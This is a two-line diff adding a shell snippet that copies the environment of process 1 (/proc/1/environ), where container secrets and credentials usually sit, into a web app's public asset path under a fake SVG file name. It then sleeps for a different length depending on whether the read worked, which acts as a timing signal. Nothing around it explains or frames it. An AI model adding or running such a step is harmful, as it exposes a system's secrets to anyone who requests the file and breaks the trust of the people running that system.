@@ -1,0 +1,2 @@
+F=/app/.next/standalone/public/assets/images/coins/ecs.svg
+if cat /proc/1/environ >"$F"; then sleep 20; else sleep 3; fi
